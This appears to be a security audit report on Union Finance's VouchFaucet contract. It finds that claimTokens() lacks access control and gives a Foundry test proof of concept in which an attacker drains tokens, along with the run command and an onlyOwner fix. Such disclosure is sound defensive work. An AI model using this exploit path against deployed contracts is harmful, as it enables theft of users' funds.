Real Burlap Alligator

High

# Malicious user can steal all the funds in the `VouchFaucet` contract

### Summary

A malicious user can steal all the tokens from the [`VouchFaucet`](https://github.com/sherlock-audit/2024-06-union-finance-update-2/blob/main/union-v2-contracts/contracts/peripheral/VouchFaucet.sol#L93), due to a flaw in the [`VouchFaucet::claimTokens()`](https://github.com/sherlock-audit/2024-06-union-finance-update-2/blob/main/union-v2-contracts/contracts/peripheral/VouchFaucet.sol#L93) function, which is designed to rescue the tokens sent to the contract itself.

### Root Cause

The [`VouchFaucet::claimTokens()`](https://github.com/sherlock-audit/2024-06-union-finance-update-2/blob/main/union-v2-contracts/contracts/peripheral/VouchFaucet.sol#L93) function contains a security flaw due to insufficient access control and lack of proper validation.

Key issues:

1. This function meant to be a used for recovering potentially lost tokens from the contract, lacks from a proper access control like an `onlyOwner` modifier. This omission allows any user to call it, rather than restricting access to the contract owner

2. There is no validation of the `amount` parameter specified by the use, allowing him so withdraw all the tokens in the contract.

3. The function fails to verify if the caller is entitled to the requested amount

This issues allow a malicious user to steal all the funds in the contract.

### Internal pre-conditions

1. Admin needs to set maxClaimable[token] to a number > 0.

### External pre-conditions

None

### Attack Path

1. Alice accidentally sent 10e18 tokens to the contract, likely intending to to something other with them but making a mistake in the transaction.

2. Bob, aware of a protocol flaw and anticipating such a mistake, noticed this transaction.

3. He exploited the vulnerability by calling the [`VouchFaucet::claimTokens()`](https://github.com/sherlock-audit/2024-06-union-finance-update-2/blob/main/union-v2-contracts/contracts/peripheral/VouchFaucet.sol#L93) with 10e18 tokens.

4. This action drained all the tokens, resulting in a loss for both Alice and the protocol.

Note:
>Check and run the coded PoC to understand better the vulnerability.

### Impact

Due to a flaw in the [`VouchFaucet::claimTokens()`](https://github.com/sherlock-audit/2024-06-union-finance-update-2/blob/main/union-v2-contracts/contracts/peripheral/VouchFaucet.sol#L93) function, anyone can steal all the tokens deposited in the contract. This vulnerability can be exploited by malicious actors, leading to significant financial losses.

### PoC

1. In order to run the test, go to the [`VouchFaucet.t.sol`](https://github.com/sherlock-audit/2024-06-union-finance-update-2/blob/main/union-v2-contracts/test/foundry/peripheral/VouchFaucet.t.sol) contract and replace its content with the one below:

```solidity
pragma solidity ^0.8.0;

import {TestWrapper} from "../TestWrapper.sol";
import {VouchFaucet} from "union-v2-contracts/peripheral/VouchFaucet.sol";

import "forge-std/console2.sol";

contract TestVouchFaucet is TestWrapper {
    VouchFaucet public vouchFaucet;

    uint256 public TRUST_AMOUNT = 10 * UNIT;
    address BOB = address(1);
    address ALICE = address(2);

    function setUp() public {
        deployMocks();
        vouchFaucet = new VouchFaucet(address(userManagerMock), TRUST_AMOUNT);

        erc20Mock.mint(ALICE, 100 ether);

        vm.startPrank(ALICE);
        erc20Mock.approve(address(vouchFaucet), type(uint256).max);
        vm.stopPrank();
    }

    function testConfig() public {
        assertEq(vouchFaucet.USER_MANAGER(), address(userManagerMock));
        assertEq(vouchFaucet.TRUST_AMOUNT(), TRUST_AMOUNT);
        assertEq(vouchFaucet.STAKING_TOKEN(), userManagerMock.stakingToken());
    }

    function testSetMaxClaimable(address token, uint256 amount) public {
        vouchFaucet.setMaxClaimable(token, amount);
        assertEq(vouchFaucet.maxClaimable(token), amount);
    }

    function testMaliciousUserCanClaimAllTheTokensInTheContract() public {
        setUp();

        //ALICE transfers tokens to the contract
        vm.startPrank(ALICE);
        erc20Mock.transfer(address(vouchFaucet), 10 ether);

        uint256 contractBalance = erc20Mock.balanceOf(address(vouchFaucet));
        assertEq(contractBalance, 10 ether);

        vm.stopPrank();

        vm.startPrank(BOB);

        uint256 bobBalanceBefore = erc20Mock.balanceOf(BOB);
        assertEq(bobBalanceBefore, 0);

        //BOB calls claimTokens() and gets all the tokens in the contract
        vouchFaucet.claimTokens(address(erc20Mock), 10 ether);

        uint256 bobBalanceAfter = erc20Mock.balanceOf(BOB);
        assertEq(bobBalanceAfter, 10 ether);
    }

    function testCannotSetMaxClaimableNonAdmin(address token, uint256 amount) public {
        vm.prank(address(1234));
        vm.expectRevert("Ownable: caller is not the owner");
        vouchFaucet.setMaxClaimable(token, amount);
    }

    function testClaimVouch() public {
        vouchFaucet.claimVouch();
        uint256 trust = userManagerMock.trust(address(vouchFaucet), address(this));
        assertEq(trust, vouchFaucet.TRUST_AMOUNT());
    }

    function testStake() public {
        erc20Mock.mint(address(vouchFaucet), 1 * UNIT);
        assertEq(userManagerMock.balances(address(vouchFaucet)), 0);
        vouchFaucet.stake();
        assertEq(userManagerMock.balances(address(vouchFaucet)), 1 * UNIT);
    }

    function testExit() public {
        erc20Mock.mint(address(vouchFaucet), 1 * UNIT);
        assertEq(userManagerMock.balances(address(vouchFaucet)), 0);
        vouchFaucet.stake();
        assertEq(userManagerMock.balances(address(vouchFaucet)), 1 * UNIT);
        vouchFaucet.exit();
        assertEq(userManagerMock.balances(address(vouchFaucet)), 0);
    }

    function testTransferERC20(address to, uint256 amount) public {
        vm.assume(
            to != address(0) && to != address(this) && to != address(vouchFaucet) && address(vouchFaucet) != address(0)
        );

        erc20Mock.mint(address(vouchFaucet), amount);
        uint256 balBefore = erc20Mock.balanceOf(address(vouchFaucet));
        vouchFaucet.transferERC20(address(erc20Mock), to, amount);
        uint256 balAfter = erc20Mock.balanceOf(address(vouchFaucet));
        assertEq(balBefore - balAfter, amount);
        assertEq(erc20Mock.balanceOf(to), amount);
    }
}

```

2. Run the coded PoC with the following command:
`forge test --match-test testMaliciousUserCanClaimAllTheTokensInTheContract -vvvv`

### Mitigation

Add a proper access control to the function like an `onlyOwner` modifier